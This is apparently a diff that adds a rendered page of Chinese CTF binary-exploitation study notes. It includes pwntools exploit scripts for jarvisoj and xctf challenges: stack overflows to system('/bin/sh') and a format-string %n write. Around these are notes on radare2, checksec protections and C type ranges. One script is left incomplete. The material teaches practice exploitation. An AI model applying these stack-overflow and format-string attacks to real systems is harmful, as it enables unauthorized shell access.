+<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u32</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00\x00\x04\x08</span><span class="s">&#39;</span><span class="p">))</span>
+<span class="s">&#39;0x8040000&#39;</span>
+</pre></div></p>
+<h4 id="runshellcode">runshellcode<a class="headerlink" href="#runshellcode" title="Permanent link"></a></h4>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">run_shellcode</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</pre></div>
+
+<h3 id="_16">相关知识<a class="headerlink" href="#_16" title="Permanent link"></a></h3>
+<p>通过ldd查找libc共享库， 这里python需要用到c语言的标准动态库, srand用到libc.so.6
+<div class="codehilite"><pre>kali@kali:/mnt/hgfs/vmware<span class="nv">$ </span>ldd guess_num 
+        linux-vdso.so.1 <span class="o">(</span>0x00007ffec67fa000<span class="o">)</span>
+        libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007faeab4e3000<span class="o">)</span>
+        /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007faeab8c1000<span class="o">)</span>
+</pre></div></p>
+<h2 id="one_gadget">one_gadget<a class="headerlink" href="#one_gadget" title="Permanent link"></a></h2>
+<p>one_gadget libc_32.so.6 
+<a href="https://xz.aliyun.com/t/6598">https://xz.aliyun.com/t/6598</a></p>
+<p>one_gadget 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见<a href="https://xz.aliyun.com/t/2720">此处</a></p>
+<h2 id="radare2">radare2使用<a class="headerlink" href="#radare2" title="Permanent link"></a></h2>
+<p>r2 ./bof</p>
+<p>aa分析</p>
+<p>afl看函数 analysis function list</p>
+<p>跳到main
+s main
+s 0x1234地址
+V 看内存
+VV 进入virtual mode，能看图</p>
+<p>s sym.hidden
+VV
+看绿色 call sym.imp.system 参数是 bin/sh
+s sym.main(转到main)</p>
+<p>执行
+./bof1</p>
+<p>光标处按:提示:&gt; 修改，
+:&gt; afvn改名字
+local_10h 改为 input
+:&gt; afvn input local_10h</p>
+<p>aa 分析
+aaa 分析 一般用这个够了
+aaaa 分析</p>
+<h2 id="_17">练习<a class="headerlink" href="#_17" title="Permanent link"></a></h2>
+<h4 id="1">1. 内存泄漏<a class="headerlink" href="#1" title="Permanent link"></a></h4>
+<p>1.内存泄漏 xman_level0 <a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d">file</a></p>
+<div class="codehilite"><pre>nc pwn2.jarvisoj.com 9881
+# 覆盖 填充长度 + 一个bp 大小(8bytes)
+</pre></div>
+
+
+<p>思路：</p>
+<p>扔进IDA看strings, 有bin/sh, 进入按X，看函数调用地址。</p>
+<p>左侧函数窗口，看main函数</p>
+<div class="codehilite"><pre>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  write(1, &quot;Hello, World\n&quot;, 0xDuLL);
+  return vulnerable_function();
+}
+</pre></div>
+
+
+<p>看 vulnerable_function</p>
+<div class="codehilite"><pre>ssize_t vulnerable_function()
+{
+  char buf; // [rsp+0h] [rbp-80h] # 读buf 占 0x80，双击进入，
+  return read(0, &amp;buf, 0x200uLL); # 就读入 0x200， 即16*16*2 =512个bytes
+}
+
+# buf 
+-0000000000000002                 db ? ; undefined
+-0000000000000001                 db ? ; undefined
++0000000000000000  s              db 8 dup(?) 
++0000000000000008  r              db 8 dup(?) # 存放返回地址， 多空余0x8字节，加上前面的0x80字节，就是0x88个字节
+</pre></div>
+
+
+<p>read可以读入0x200，即512个字符，而从buf到vulnerable_function的返回地址只有0x80+0x8,即 136个字节 &lt; 512，因此可以覆盖 vulnerable_function 的返回地址为 call_system 函数地址，即可getshell</p>
+<div class="codehilite"><pre><span class="c1"># -*- coding:utf-8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;pwn2.jarvisoj.com&quot;</span><span class="p">,</span><span class="mi">9881</span><span class="p">)</span> 
+<span class="n">junk</span> <span class="o">=</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x80</span> <span class="c1"># 随意填充0x80个，</span>
+
+
+<span class="n">fakebp</span> <span class="o">=</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># 看char buf，双击进buf，最下面还有8个bytes</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x0000000000400596</span> <span class="c1"># ida 查看 exports 填入地址</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">fakebp</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="c1"># 正常是vulnerable_function()返回地址，我们这里覆盖为syscall地址，得到shell</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h4 id="symbol-system">读取 symbol system的地址<a class="headerlink" href="#symbol-system" title="Permanent link"></a></h4>
+<div class="codehilite"><pre><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;pwn2.jarvisoj.com&quot;</span><span class="p">,</span><span class="mi">9878</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./level2&quot;</span><span class="p">)</span>
+
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&quot;system&quot;</span><span class="p">]</span>                     <span class="c1"># IDA对应的函数为 _system 0x08048320</span>
+<span class="n">bin_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">__next__</span><span class="p">()</span> <span class="c1"># IDA可见 0x804a024</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>                 <span class="c1">#辣鸡填充值</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;latin&#39;</span><span class="p">)</span>   <span class="c1">#覆盖返回地址到system函数</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;latin&#39;</span><span class="p">)</span> <span class="c1">#随意填写system函数调用结束的返回地址 0x1也行</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;latin&#39;</span><span class="p">)</span>   <span class="c1">#system函数的参数，指向“/bin/sh”，实现调用</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+
+<h2 id="wiki">Wiki<a class="headerlink" href="#wiki" title="Permanent link"></a></h2>
+<h3 id="checksec">checksec 、 二进制保护机制<a class="headerlink" href="#checksec" title="Permanent link"></a></h3>
+<p><strong>0x00 checksec</strong></p>
+<p>打开了RELRO、Canary和NX，那就没办法做栈溢出了。</p>
+<p>这里主要讲的是CTF中linux下的ELF二进制文件的保护机制。在linux中有一个脚本checksec命令可以查看当前二进制文件的保护机制。任意安装一款gdb插件都会把checksec脚本包含进来。</p>
+<div class="codehilite"><pre>在gdb中执行：
+gdb&gt; checksec test
+Canary                      : No
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                        : Partial
+
+直接在shell中执行：
+$ checksec test
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+可以看到checksec可以查看当前二进制文件的指令架构以及采取了哪些保护机制。
+</pre></div>
+
+
+<p>示例2</p>
+<div class="codehilite"><pre>确定保护
+
+jarvisOJ_typo [master●●] check ./typo
+typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
+[*] &#39;/home/m4x/pwn_repo/jarvisOJ_typo/typo&#39;
+    Arch:     arm-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8000)
+静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 system 等危险函数和 &quot;/bin/sh&quot; 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell
+</pre></div>
+
+
+<hr />
+<p><strong>0x01 二进制保护机制</strong></p>
+<p><strong>1.Canary（栈保护）</strong></p>
+<p>这个选项表示栈保护功能有没有开启。</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<p><strong>2.NX/DEP（堆栈不可执行）</strong></p>
+<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p><img alt="Alt text" src="imgs/pwn03.png" /></p>
+<p><strong>3.PIE/ASLR（地址随机化）</strong></p>
+<p>开启后地址变量地址不固定</p>
+<p>__4.Fortify __</p>
+<p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>
+<p><strong>5.RelRO</strong></p>
+<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
+<p>0x02 <a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">参考</a></p>
+<h3 id="_18">栈<a class="headerlink" href="#_18" title="Permanent link"></a></h3>
+<p>参数入栈方式是从右向左。</p>
+<p><img alt="Alt text" src="imgs/pwn_stack01.jpg" /></p>
+<p><img alt="Alt text" src="imgs/pwn_01_stack01.jpg" /></p>
+<h3 id="c">C代码翻译<a class="headerlink" href="#c" title="Permanent link"></a></h3>
+<p><code>_readfsqword(0x28u)</code> 通常用于alarm函数，防止调试</p>
+<p><code>strcmp(str1,str2)</code> ，若str1=str2，则返回零；若str1<str2，则返回负数；若str1>str2，则返回正数</p>
+<h3 id="c_1">C语言各数据类型大小和取值范围<a class="headerlink" href="#c_1" title="Permanent link"></a></h3>
+<p><a href="http://shell-storm.org/shellcode/files/syscalls.html">Linux System Call Table</a></p>
+<p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">LINUX SYSTEM CALL TABLE FOR X86 64</a></p>
+<p>有符号整数类型</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>字节数</th>
+<th>取值范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>signed char</td>
+<td>1</td>
+<td>-2^7(-128) ~ 2^7-1(127)</td>
+</tr>
+<tr>
+<td>short int 或 short</td>
+<td>2</td>
+<td>-2^15(-32 768) ~ 2^15-1(32 767)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4</td>
+<td>-2^31(-2 147 483 648) ~ 2^31-1(2 147 483 647)</td>
+</tr>
+<tr>
+<td>long int 或 long</td>
+<td>4</td>
+<td>-2^31(-2 147 483 648) ~ 2^31-1(2 147 483 647)</td>
+</tr>
+<tr>
+<td>long long int 或 long long</td>
+<td>8</td>
+<td>-2^63(-9.2233720368548e+18) ~ 2^63-1(9.2233720368548e+18)</td>
+</tr>
+</tbody>
+</table>
+<p>无符号整数类型</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>字节数</th>
+<th>取值范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>unsigned char</td>
+<td>1</td>
+<td>0 ~ 2^8-1(255)</td>
+</tr>
+<tr>
+<td>unsigned short int 或 unsigned short</td>
+<td>2</td>
+<td>0 ~ 2^16-1(65 535)</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4</td>
+<td>0 ~ 2^32-1(4 294 967 295)</td>
+</tr>
+<tr>
+<td>unsigned long int 或 unsigned long</td>
+<td>4</td>
+<td>0 ~ 2^32-1(4 294 967 295)</td>
+</tr>
+<tr>
+<td>unsigned long long int 或 unsigned long long</td>
+<td>8</td>
+<td>0 ~ 2^64-1(1.844674407371e+19)</td>
+</tr>
+</tbody>
+</table>
+<p>浮点类型</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>字节数</th>
+<th>取值范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>float</td>
+<td>4</td>
+<td>-/+3.4e38（精确到6位小数）</td>
+</tr>
+<tr>
+<td>double</td>
+<td>8</td>
+<td>-/+1.7e308（精确到15位小数）</td>
+</tr>
+<tr>
+<td>long double</td>
+<td>12</td>
+<td>-/+1.19e4932（精确到18位小数）</td>
+</tr>
+</tbody>
+</table>
+<p>极限值符号</p>
+<p>表示有符号整数类型的极限值符号</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>下限</th>
+<th>上限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>char</td>
+<td>CHAR_MIN</td>
+<td>CHAR_MAX</td>
+</tr>
+<tr>
+<td>short</td>
+<td>SHRT_MIN</td>
+<td>SHRT_MAX</td>
+</tr>
+<tr>
+<td>int</td>
+<td>INT_MIN</td>
+<td>INT_MAX</td>
+</tr>
+<tr>
+<td>long</td>
+<td>LONG_MIN</td>
+<td>LONG_MAX</td>
+</tr>
+<tr>
+<td>long long</td>
+<td>LLONG_MIN</td>
+<td>LLONG_MAX</td>
+</tr>
+</tbody>
+</table>
+<p>表示无符号整数类型的极限值符号</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>下限</th>
+<th>上限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>unsigned char</td>
+<td>0</td>
+<td>UCHAR_MAX</td>
+</tr>
+<tr>
+<td>unsigned short</td>
+<td>0</td>
+<td>USHRT_MAX</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>0</td>
+<td>UINT_MAX</td>
+</tr>
+<tr>
+<td>unsigned long</td>
+<td>0</td>
+<td>ULONG_MAX</td>
+</tr>
+<tr>
+<td>unsigned long long</td>
+<td>0</td>
+<td>ULLONG_MAX</td>
+</tr>
+</tbody>
+</table>
+<p>表示浮点类型的极限值符号</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>下限</th>
+<th>上限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>float</td>
+<td>FLT_MIN</td>
+<td>FLT_MAX</td>
+</tr>
+<tr>
+<td>double</td>
+<td>DBL_MIN</td>
+<td>DBL_MAX</td>
+</tr>
+<tr>
+<td>long double</td>
+<td>LDBL_MIN</td>
+<td>LDBL_MAX</td>
+</tr>
+</tbody>
+</table>
+<h3 id="printf">printf<a class="headerlink" href="#printf" title="Permanent link"></a></h3>
+<div class="codehilite"><pre>%d - 十进制 - 输出十进制整数
+%s - 字符串 - 从内存中读取字符串
+%x - 十六进制 - 输出十六进制数
+%c - 字符 - 输出字符
+%p - 指针 - 指针地址
+%n - 到目前为止所写的字符数,%n这个格式化字符串，它的功能是将%n之前打印出来的字符个数，赋值给一个变量，例如这样：
+     可以理解成 %n 是对变量赋值, 值为长度数
+     %?$n 向栈内第?个指向的 地址处写入字符串长度。
+     比如栈内第2个值为0x40056a, %85c%2$n，就是向地址0x40056a写入85
+</pre></div>
+
+
+<p><a href="https://blog.csdn.net/qinying001/article/details/98527949">Link</a> 可以理解成 %n 是对变量赋值, 值为长度数</p>
+<div class="codehilite"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello world%n&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="c1">// Hello world11, a的值被改变了, gcc编译下。</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>任意内存读取</p>
+<div class="codehilite"><pre>#include &lt;stdio.h&gt;
+int (){
+        char str[100];
+        scanf(&quot;%s&quot;,str);
+        printf(str);
+}
+</pre></div>
+
+<p>任意内存写入</p>
+<div class="codehilite"><pre>printf(&quot;addr%m$n&quot;,&amp;arg);
+在addr地址的第m个参数写入4个字节(addr)的数据，arg=4
+</pre></div>
+
+<p>%85c%7$n ，作用是将85写入栈内第7个参数所指向的地址。</p>
+<p>在 printf 中，使用 <code>*&lt;a_number_of_chars&gt;%&lt;number&gt;$n*</code> 就可以将相应的第 <code>*&lt;number&gt;*</code> 个参数的位置写为 % 前输出的字符数量</p>
+<p>如本题先用 %85c 输出了85个字符，再用 %7$n 将第七个参数的位置写成了85</p>
+<h4 id="_19">$的作用<a class="headerlink" href="#_19" title="Permanent link"></a></h4>
+<p>Linux下, x$指栈第x个参数的地址, 下面2$指第2个地址, $1指第一个地址. 即输出2, 3
+<div class="codehilite"><pre>    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%2$d %1$d&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+</pre></div></p>
+<h4 id="cgfsb">示例 CGfsb<a class="headerlink" href="#cgfsb" title="Permanent link"></a></h4>
+<p>通常2次输入</p>
+<div class="codehilite"><pre>1.1111
+2.输入 aaaa-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
+aaaa-ffffd22e-f7fb4580-00000001-00000000-00000001-f7ffd940-31310001-000a3131-00000000-61616161-3830252d-30252d78
+***1-*******2-*******3-*******4-*******5-*******6-*******7-*******8-*******9-******10-*&#39;1111&#39;*
+</pre></div>
+
+
+<p>偏移是10, 拖动调试。第二次printf处下断点。 </p>
+<div class="codehilite"><pre>payload = flat(p32(0x0804A068), &#39;a&#39;*4 ,&#39;%10$n&#39;)
+send(payload)后
+</pre></div>
+
+
+<p>x/16wx $esp # 查看栈情况</p>
+<div class="codehilite"><pre>fff2a488 fff2a47e f7f47580 00000001 00000000 00000001 f7f90940 61610001 000a6161 00000000 0804a068 61616161
+******01 ******02 ******03 ******04 ******05 ******06 ******07 ******08 ******09 ******10 ******11 ***aaaa*
+</pre></div>
+
+
+<p>exp:</p>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;debug&#39;</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./e41a0f684d0e497f87bb309f91737e4d&#39;</span><span class="p">)</span>
+<span class="c1"># conn = remote(&quot;220.249.52.133&quot;,56225)</span>
+<span class="n">pwnme</span> <span class="o">=</span> 
+<span class="n">payload1</span> <span class="o">=</span> <span class="s">&#39;aaaa&#39;</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">),</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="p">,</span><span class="s">&#39;%10$n&#39;</span><span class="p">)</span>  <span class="c1">#pwnme地址占4个字节，所以后面需要打印4个a</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;please tell me your name:&#39;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="c1"># gdb.attach(conn)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;leave your message please:&#39;</span><span class="p">)</span> 
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</pre></div>
+
+<h3 id="plt-glt">PLT &amp; GLT<a class="headerlink" href="#plt-glt" title="Permanent link"></a></h3>
+<p><a href="https://blog.csdn.net/linyt/article/details/51635768">Link</a></p>
+<table>
+<thead>
+<tr>
+<th>简称</th>
+<th>全称</th>
+<th>Desc</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GOT</td>
+<td>Global Offset Table</td>
+<td>存放函数地址的数据表，重局偏移表</td>
+</tr>
+<tr>
+<td>PLT</td>
+<td>Procedure Link Table</td>
+<td>额外代码段表，称为程序链接表</td>
+</tr>
+</tbody>
+</table>
+<p>联合出手完成重定位。</p>
+<p><img alt="" src="imgs/C01.jpg" title="Optional title" /></p>
+<h3 id="_20">常用函数<a class="headerlink" href="#_20" title="Permanent link"></a></h3>
+<h4 id="read">read()<a class="headerlink" href="#read" title="Permanent link"></a></h4>
+<p>用于文件描述符对应的文件中读取数据，原型：</p>
+<p><code>ssize_t read(int fd,void*buf,size_t count)</code></p>
+<p>参数说明：</p>
+<div class="codehilite"><pre>fd: 是文件描述符, 从command line获取数据时，为0
+buf: 为读出数据的缓冲区；
+count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保
+存在缓冲区buf中，同时文件的当前读写位置向后移）
+</pre></div>
+
+
+<p>返回值：</p>
+<div class="codehilite"><pre>成功：返回读出的字节数
+失败：返回-1，并设置errno，如果在调用read
+之前到达文件末尾，则这次read返回0
+</pre></div>
+
+
+<h4 id="write">write()<a class="headerlink" href="#write" title="Permanent link"></a></h4>
+<p>用于将数据写入到文件描述符对应的文件，原型：</p>
+<p><code>ssize_t write(int fd,const void*buf,size_t count);</code></p>
+<p>参数说明：</p>
+<div class="codehilite"><pre>fd:是文件描述符（输出到command line，就是1）
+buf:通常是一个字符串，需要写入的字符串
+count：是每次写入的字节数
+</pre></div>
+
+
+<p>返回值：</p>
+<div class="codehilite"><pre>成功：返回写入的字节数
+失败：返回-1并设置errno
+ps： 写常规文件时，write的返回值通常等于请求写的字节
+数count， 而向终端设备或者网络写时则不一定
+</pre></div>
+
+
+<p>因此，read函数就可以取代scanf从command line读取数据；write函数就可以代替printf，往command line打印输出。</p>
+<h1 id="ida">IDA查看栈底地址<a class="headerlink" href="#ida" title="Permanent link"></a></h1>
+<p>xctf stack2示例
+<div class="codehilite"><pre><span class="o">-</span><span class="mo">00000070</span> <span class="n">var_70</span>          <span class="n">db</span> <span class="mi">100</span> <span class="n">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
+<span class="o">-</span><span class="mo">0000000</span><span class="n">C</span> <span class="n">var_C</span>           <span class="n">dd</span> <span class="err">?</span>
+<span class="o">-</span><span class="mo">0000000</span><span class="mi">8</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000007</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000006</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000005</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000004</span> <span class="n">var_4</span>           <span class="n">dd</span> <span class="err">?</span>
+<span class="o">+</span><span class="mo">00000000</span>  <span class="n">s</span>              <span class="n">db</span> <span class="mi">4</span> <span class="n">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
+<span class="o">+</span><span class="mo">00000004</span>  <span class="n">r</span>              <span class="n">db</span> <span class="mi">4</span> <span class="n">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
+<span class="o">+</span><span class="mo">0000000</span><span class="mi">8</span> <span class="n">argc</span>            <span class="n">dd</span> <span class="err">?</span>
+<span class="o">+</span><span class="mo">0000000</span><span class="n">C</span> <span class="n">argv</span>            <span class="n">dd</span> <span class="err">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="o">+</span><span class="mo">00000010</span> <span class="n">envp</span>            <span class="n">dd</span> <span class="err">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="o">+</span><span class="mo">00000014</span>
+<span class="o">+</span><span class="mo">00000014</span> <span class="p">;</span> <span class="n">end</span> <span class="n">of</span> <span class="n">stack</span> <span class="n">variables</span>
+</pre></div>
+偏移值是0x84, 即栈底地址.</p>
+<p>动态调试见 xctf_pwn_stack2.pdf。</p></article></body></html>
